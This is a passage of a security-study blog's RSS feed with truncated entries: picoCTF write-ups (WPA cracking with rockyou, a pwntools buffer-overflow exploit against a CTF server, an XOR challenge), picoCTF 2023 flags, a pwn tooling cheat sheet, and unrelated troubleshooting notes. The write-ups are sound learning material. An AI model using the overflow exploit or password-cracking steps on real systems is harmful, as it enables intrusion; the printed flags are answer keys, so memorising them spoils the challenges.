#########.#.#.#...#...#.# 
#...........#.#.#.#.#.#.# 
#########...#.#.#.#.#.#.# 
#.......#...#.#.#.#.#.#.# 
####.####...#.#.#.#.#.#.# 
##..........#.#.#.#.#.#.# 
#.#..####...#.#.#.#.#.#.# 
#..#....#####.#.#.#.#.#.# 
#...#...#...#.#.#...#...# 
#....#........#.######### 
#...........#.#........&amp;gt;# 
########################. 
... .......
.&amp;lt;. ..###..
... .#...#.
... .#####.
 .#...#.
 .#...#.
 .......
 .......
 
#####################################################################################..............#
#####################################################################################.#####.###....#
#####################################################################################.#.......#....#
#####################################################################################.###......#...#
#####################################################################################.#.......#....#
#####################################################################################.#####.###....#
#####################################################################################..............#
#####################################################################################..............#
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - WPA-ing Out</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/</guid><description>&lt;h1 id="picoctf---wpa-ing-out">
 PicoCTF - WPA-ing Out
 &lt;a class="anchor" href="#picoctf---wpa-ing-out">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/206?category=4&amp;amp;page=2">WPA-ing Out&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10280033">Day 26 Wireless Attacks-無線攻擊(aircrack-ng)&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the &lt;font color="FF0000">&lt;code>rockyou.txt&lt;/code>&lt;/font> credential dump. Use this &lt;a href="https://artifacts.picoctf.net/c/8/wpa-ing_out.pcap">&lt;code>pcap file&lt;/code>&lt;/a> and the &lt;code>rockyou&lt;/code> wordlist. The flag should be entered in the &lt;code>picoCTF{XXXXXX}&lt;/code> format.&lt;/p></description></item><item><title>PicoCTF - x-sixty-what</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---x-sixty-what/</guid><description>&lt;h1 id="picoctf---x-sixty-what">
 PicoCTF - x-sixty-what
 &lt;a class="anchor" href="#picoctf---x-sixty-what">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>，發現應該return到0x40123b，不太知道為甚麼&lt;/p>
&lt;ul>
&lt;li>
&lt;p>第一張是return 2 0x401236
&lt;img src="https://hackmd.io/_uploads/Bk2PZ_0ch.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>第二張是return 2 0x40123b
&lt;img src="https://hackmd.io/_uploads/SymO-uAqn.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>用動態的方式看offset
$$
0x7fffffffd758 - 0x00007fffffffd710 = 0x48
$$&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

r = remote(&amp;#39;saturn.picoctf.net&amp;#39;, 58166)
# r = process(&amp;#39;./vuln&amp;#39;)
context.arch = &amp;#39;amd64&amp;#39;

raw_input()
print(r.recvline().strip().decode())

payload = b&amp;#39;a&amp;#39;*0x48 + p64(0x40123b)
print(payload)
r.sendline(payload)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>picoCTF{b1663r_15_b3773r_e79d5a75}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;div class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
&lt;p>&lt;a href="https://ctftime.org/writeup/33199">x-sixty-what WP&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p></description></item><item><title>PicoCTF - XtraORdinary</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/</guid><description>&lt;h1 id="picoctf---xtraordinary">
 PicoCTF - XtraORdinary
 &lt;a class="anchor" href="#picoctf---xtraordinary">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.finxter.com/how-to-convert-hex-string-to-bytes-in-python/">How to Convert Hex String to Bytes in Python?&lt;/a>
&lt;a href="https://myapollo.com.tw/blog/python-itertools-more-itertools/">Python 好用模組介紹 - itertools &amp;amp; more-itertools&lt;/a>
&lt;a href="https://www.w3schools.com/python/ref_file_readline.asp">Python File readline() Method&lt;/a>
&lt;a href="https://www.geeksforgeeks.org/python-append-to-a-file/">Python append to a file&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/env python3

from random import randint
with open(&amp;#39;flag.txt&amp;#39;, &amp;#39;rb&amp;#39;) as f:
 flag = f.read()

with open(&amp;#39;secret-key.txt&amp;#39;, &amp;#39;rb&amp;#39;) as f:
 key = f.read()

def encrypt(ptxt, key):
 ctxt = b&amp;#39;&amp;#39;
 for i in range(len(ptxt)):
 a = ptxt[i]
 b = key[i % len(key)]
 ctxt += bytes([a ^ b])
 return ctxt

ctxt = encrypt(flag, key)

random_strs = [
 b&amp;#39;my encryption method&amp;#39;,
 b&amp;#39;is absolutely impenetrable&amp;#39;,
 b&amp;#39;and you will never&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;ever&amp;#39;,
 b&amp;#39;break it&amp;#39;
]

for random_str in random_strs:
 for i in range(randint(0, pow(2, 8))):
 for j in range(randint(0, pow(2, 6))):
 for k in range(randint(0, pow(2, 4))):
 for l in range(randint(0, pow(2, 2))):
 for m in range(randint(0, pow(2, 0))):
 ctxt = encrypt(ctxt, random_str)

with open(&amp;#39;output.txt&amp;#39;, &amp;#39;w&amp;#39;) as f:
 f.write(ctxt.hex())
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF 2023</title><link>https://bernie6401.github.io/docs/security/competition/picoctf-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/picoctf-2023/</guid><description>&lt;h1 id="picoctf-2023">
 PicoCTF 2023
 &lt;a class="anchor" href="#picoctf-2023">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler
[TOC]
:::&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="hidetosee">
 HideToSee
 &lt;a class="anchor" href="#hidetosee">#&lt;/a>
&lt;/h3>
&lt;h4 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h4>
&lt;p>這一題比較像是Misc題目，比賽的時候想了很久都沒進展，賽後看了&lt;a href="https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Cryptography/HideToSee/HideToSee.md">write up&lt;/a>才覺得異常簡單，當初應該也是有往這方面想，但沒有用steghide&lt;/p>
&lt;h4 id="exploit---steghide--atbash">
 Exploit - Steghide + Atbash
 &lt;a class="anchor" href="#exploit---steghide--atbash">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>先用steghide解密出隱藏的文檔
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ steghide extract -sf atbash.jpg
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>用&lt;a href="https://www.dcode.fr/atbash-cipher">online tool&lt;/a>解密
&lt;img src="https://hackmd.io/_uploads/rJQVLEnPn.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="reverse">
 Reverse
 &lt;a class="anchor" href="#reverse">#&lt;/a>
&lt;/h2>
&lt;h3 id="reverse-1">
 Reverse
 &lt;a class="anchor" href="#reverse-1">#&lt;/a>
&lt;/h3>
&lt;p>IDA
Flag: &lt;code>picoCTF{3lf_r3v3r5ing_succe55ful_8108250b}&lt;/code>&lt;/p>
&lt;h3 id="safe-opener-2">
 Safe Opener 2
 &lt;a class="anchor" href="#safe-opener-2">#&lt;/a>
&lt;/h3>
&lt;p>Strings search
Flag: &lt;code>picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_ccb5525e}&lt;/code>&lt;/p>
&lt;h3 id="timer">
 timer
 &lt;a class="anchor" href="#timer">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;code>mobsf&lt;/code>
Flag: &lt;code>picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}&lt;/code>&lt;/p>
&lt;h3 id="ready-gladiator-0">
 Ready Gladiator 0
 &lt;a class="anchor" href="#ready-gladiator-0">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>???&lt;/li>
&lt;li>&lt;code>picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="forensics">
 Forensics
 &lt;a class="anchor" href="#forensics">#&lt;/a>
&lt;/h2>
&lt;h3 id="hideme">
 hideme
 &lt;a class="anchor" href="#hideme">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;code>binwalk&lt;/code> to observe that it should be a &lt;code>zip&lt;/code> file.&lt;/p></description></item><item><title>Problems About Multiprocess</title><link>https://bernie6401.github.io/docs/problem-solutions/problems-about-multiprocess/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/problems-about-multiprocess/</guid><description>&lt;h1 id="problems-about-multiprocess">
 Problems About Multiprocess
 &lt;a class="anchor" href="#problems-about-multiprocess">#&lt;/a>
&lt;/h1>
&lt;p>&lt;a href="https://blog.csdn.net/LutingWang/article/details/124203032">徹底解出TypeError: cannot pickle &amp;lsquo;_thread.RLock&amp;rsquo; object，以PyTorch DDP 為例 &lt;/a>
&lt;a href="https://blog.csdn.net/jbluxun/article/details/134167082">TypeError: cannot pickle &amp;lsquo;_thread.lock&amp;rsquo; object的一個淺層解決方法&lt;/a>
&lt;a href="https://blog.csdn.net/nangua06/article/details/129668222">ForkingPickler can&amp;rsquo;t pickle weakref objects&lt;/a>&lt;/p></description></item><item><title>Programming Related</title><link>https://bernie6401.github.io/docs/terminology/programming-related/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/terminology/programming-related/</guid><description>&lt;h1 id="programming-related">
 Programming Related
 &lt;a class="anchor" href="#programming-related">#&lt;/a>
&lt;/h1>
&lt;h2 id="what-is-namespace-in-programming">
 What is namespace in programming?
 &lt;a class="anchor" href="#what-is-namespace-in-programming">#&lt;/a>
&lt;/h2>
&lt;p>From ChatGPT
在程式語言中，&lt;strong>namespace&lt;/strong>（命名空間）是一種用來&lt;strong>組織和管理代碼&lt;/strong>的機制，目的是避免名稱衝突並提升代碼的可讀性和結構化。&lt;/p>
&lt;hr>
&lt;h3 id="namespace-的概念與作用">
 &lt;strong>Namespace 的概念與作用&lt;/strong>
 &lt;a class="anchor" href="#namespace-%e7%9a%84%e6%a6%82%e5%bf%b5%e8%88%87%e4%bd%9c%e7%94%a8">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>名稱分隔&lt;/strong>&lt;br>
命名空間可以將代碼中的名稱（如變數、函數、類別等）組織起來，避免與其他代碼中的名稱發生衝突。&lt;/p>
&lt;ul>
&lt;li>例如，兩個不同的模組中可能都定義了名稱為 &lt;code>calculate&lt;/code> 的函數，但由於它們位於不同的命名空間，因此可以共存。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>代碼組織&lt;/strong>&lt;br>
命名空間可以將相關聯的功能分組在一起，使代碼結構更加清晰，便於維護和重用。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>避免名稱污染&lt;/strong>&lt;br>
命名空間可以避免全域命名空間中的名稱被不小心覆蓋或污染，降低了意外錯誤的可能性。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h3 id="namespace-的具體表現">
 &lt;strong>Namespace 的具體表現&lt;/strong>
 &lt;a class="anchor" href="#namespace-%e7%9a%84%e5%85%b7%e9%ab%94%e8%a1%a8%e7%8f%be">#&lt;/a>
&lt;/h3>
&lt;h4 id="1-c">
 1. &lt;strong>C++&lt;/strong>
 &lt;a class="anchor" href="#1-c">#&lt;/a>
&lt;/h4>
&lt;p>在 C++ 中，命名空間是通過 &lt;code>namespace&lt;/code> 關鍵字來實現的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> Math {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">add&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a, &lt;span style="color:#66d9ef">int&lt;/span> b) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> a &lt;span style="color:#f92672">+&lt;/span> b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">namespace&lt;/span> Physics {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">add&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> a, &lt;span style="color:#66d9ef">int&lt;/span> b) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> a &lt;span style="color:#f92672">-&lt;/span> b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> std&lt;span style="color:#f92672">::&lt;/span>cout &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> Math&lt;span style="color:#f92672">::&lt;/span>add(&lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> std&lt;span style="color:#f92672">::&lt;/span>endl; &lt;span style="color:#75715e">// 使用 Math 的 add 函數
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> std&lt;span style="color:#f92672">::&lt;/span>cout &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> Physics&lt;span style="color:#f92672">::&lt;/span>add(&lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> std&lt;span style="color:#f92672">::&lt;/span>endl; &lt;span style="color:#75715e">// 使用 Physics 的 add 函數
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="2-python">
 2. &lt;strong>Python&lt;/strong>
 &lt;a class="anchor" href="#2-python">#&lt;/a>
&lt;/h4>
&lt;p>在 Python 中，每個模組（module）本身就是一個命名空間，通過 &lt;code>import&lt;/code> 來使用其他命名空間的內容。&lt;/p></description></item><item><title>PWN Overview</title><link>https://bernie6401.github.io/docs/tools/ctf/pwn-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/pwn-overview/</guid><description>&lt;h1 id="pwn-overview">
 PWN Overview
 &lt;a class="anchor" href="#pwn-overview">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="tools-cheat">
 Tools Cheat
 &lt;a class="anchor" href="#tools-cheat">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Commonly Used Commands
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file {file path}
$ checksec {file path} # sudo apt-get install checksec
$ objdump -M intel -d {file path} | less
$ gdb {file path} # sudo apt-get install gdb
$ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等
$ readelf -S {file path} # 只查看sections&amp;#39; header
$ ldd {file path} # to check what libraries the file used
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Command Used Tools / Plugin
&lt;ul>
&lt;li>&lt;a href="https://github.com/longld/peda">gdb-peda&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/longld/peda.git ~/peda
$ echo &amp;#34;source ~/peda/peda.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://github.com/radareorg/radare2">radare2&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/radare/radare2.git
$ sudo apt install build-essential # just for wsl
$ sudo ./radare2/sys/install.sh
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;a href="https://www.exploit-db.com/shellcodes">Exploit DB - Shell Code&lt;/a>：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對&lt;/li>
&lt;li>&lt;a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install python3-pip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -H python3 -m pip install ROPgadget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For using&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> | grep &lt;span style="color:#e6db74">&amp;#39;pop rax.*ret&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Or&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> &amp;gt; rop_gadget.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> --multibr &amp;gt; rop_gadget.txt &lt;span style="color:#75715e"># multibr是multi bransh允許多分支的gadget&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 取得特定string的gadget&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --string &lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>&lt;a href="https://github.com/david942j/one_gadget">one_gadget&lt;/a>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install rubygems
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo gem install one_gadget
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ one_gadget &lt;span style="color:#f92672">{&lt;/span>libc file&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>seccomp-tools
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install gcc ruby-dev
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ gem install seccomp-tools
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ seccomp-tools dump ./test
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>找glibc版本的online tool
&lt;a href="https://libc.rip/">libc-database search API Search&lt;/a>
&lt;a href="https://libc.blukat.me/?q=__libc_start_main_ret">libc database search&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="gdb">
 gdb
 &lt;a class="anchor" href="#gdb">#&lt;/a>
&lt;/h3>
&lt;p>:::spoiler 常用語法(&lt;a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">cheat&lt;/a>)&lt;/p></description></item><item><title>pwndbg installation problems</title><link>https://bernie6401.github.io/docs/problem-solutions/pwndbg-installation-problems/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/pwndbg-installation-problems/</guid><description>&lt;h1 id="pwndbg-installation-problems">
 pwndbg installation problems
 &lt;a class="anchor" href="#pwndbg-installation-problems">#&lt;/a>
&lt;/h1>
&lt;h2 id="normal-installation">
 Normal Installation
 &lt;a class="anchor" href="#normal-installation">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/pwndbg/pwndbg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd pwndbg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./setup.sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="problem-i">
 Problem I
 &lt;a class="anchor" href="#problem-i">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">The following information may help to resolve the situation:

The following packages have unmet dependencies:
 python3-venv : Depends: python3.8-venv (&amp;gt;= 3.8.2-1~) but it is not going to be installed
 Depends: python3 (= 3.8.2-0ubuntu2) but 3.10.4-0ubuntu2 is to be installed
E: Unable to correct problems, you have held broken packages.
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>如果遇到這種的問題，就直接分析setup.sh是crash在哪邊，照理說應該是跟python的版本有關係，想我的狀況是原本安裝python3的version是3.10，而不是3.8，所以最直接的做法是修改setup.sh file，在第23行的地方修改一下，直接指定安裝的版本，另外&lt;/p></description></item><item><title>React Native - Error resolving plugin [id: 'com.facebook.react.settings']</title><link>https://bernie6401.github.io/docs/problem-solutions/react-native---error-resolving-plugin-id_-com.facebook.react.settings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/react-native---error-resolving-plugin-id_-com.facebook.react.settings/</guid><description>&lt;h1 id="react-native---error-resolving-plugin-id-comfacebookreactsettings">
 React Native - Error resolving plugin [id: &amp;lsquo;com.facebook.react.settings&amp;rsquo;]
 &lt;a class="anchor" href="#react-native---error-resolving-plugin-id-comfacebookreactsettings">#&lt;/a>
&lt;/h1>
&lt;h2 id="problem-statement">
 Problem Statement
 &lt;a class="anchor" href="#problem-statement">#&lt;/a>
&lt;/h2>
&lt;p>這個錯誤是發生在我想要創建一個新的React Native專案，但不管是用&lt;a href="https://reactnative.cn/docs/environment-setup">Official Document&lt;/a>還是其他網路文章的分享，我都無法順利創建，確切的錯誤message如下&lt;/p>
&lt;pre tabindex="0">&lt;code>$ yarn android
yarn run v1.22.22
$ react-native run-android
(node:13044) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
(Use `node --trace-deprecation ...` to show where the warning was created)
info A dev server is already running for this project on port 8081.
info Installing the app...

info 💡 Tip: Make sure that you have set up your development environment correctly, by running npx react-native doctor. To read more about doctor command visit: https://github.com/react-native-community/cli/blob/main/packages/cli-doctor/README.md#doctor


FAILURE: Build failed with an exception.

* Where:
Settings file &amp;#39;D:\Downloads\Trash\MyProject\android\settings.gradle&amp;#39; line: 2

* What went wrong:
Error resolving plugin [id: &amp;#39;com.facebook.react.settings&amp;#39;]
&amp;gt; java.io.UncheckedIOException: Could not move temporary workspace (D:\Downloads\Trash\MyProject\android\.gradle\8.8\dependencies-accessors\569c8b261a8a714d7731d5f568e0e5c05babae10-3763ef7e-e78a-4639-821b-3aa92091847a) to immutable location (D:\Downloads\Trash\MyProject\android\.gradle\8.8\dependencies-accessors\569c8b261a8a714d7731d5f568e0e5c05babae10)
&lt;/code>&lt;/pre>&lt;p>我是按照官方的文檔進行創建，而錯誤是發生在gradle的setting file中發生問題(MyProject\android\settings.gradle)，具體來說應該是版本上的問題，有嘗試針對以下文章說明的解決方式試看看，但都一無所獲&lt;/p></description></item><item><title>Real World Tools</title><link>https://bernie6401.github.io/docs/tools/others/real-world-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/real-world-tools/</guid><description>&lt;h1 id="real-world-tools">
 Real World Tools
 &lt;a class="anchor" href="#real-world-tools">#&lt;/a>
&lt;/h1>
&lt;h2 id="kali-linux">
 Kali-Linux
 &lt;a class="anchor" href="#kali-linux">#&lt;/a>
&lt;/h2>
